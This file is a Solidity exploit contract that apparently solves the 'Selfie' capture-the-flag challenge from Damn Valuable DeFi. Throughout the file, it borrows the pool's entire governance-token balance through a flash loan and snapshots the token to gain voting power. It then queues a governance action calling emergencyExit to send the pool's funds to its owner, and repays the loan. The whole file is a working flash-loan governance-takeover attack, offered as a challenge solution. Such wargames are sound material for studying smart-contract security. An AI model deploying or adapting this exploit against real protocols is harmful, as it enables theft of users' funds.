// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";

contract SelfieTaker is IERC3156FlashBorrower {
    
    address owner;
    address governToken;
    SelfiePool pool;
    SimpleGovernance governance;
    uint256 public actionId;

    constructor() {
        owner = msg.sender;
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {

        DamnValuableTokenSnapshot(token).snapshot();
        bytes memory functionCall = abi.encodeWithSignature("emergencyExit(address)", owner);
        actionId = governance.queueAction(address(pool), 0, functionCall);

        ERC20(governToken).approve(address(pool), amount);
        return(keccak256("ERC3156FlashBorrower.onFlashLoan"));
    }

    function requestFlashLoan(SelfiePool _pool, SimpleGovernance _governance) external payable {
        pool = _pool;
        governance = _governance;

        governToken = governance.getGovernanceToken();
        uint256 balance = pool.maxFlashLoan(governToken);

        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(governToken), balance, "");
    }

    receive() external payable {

    }

}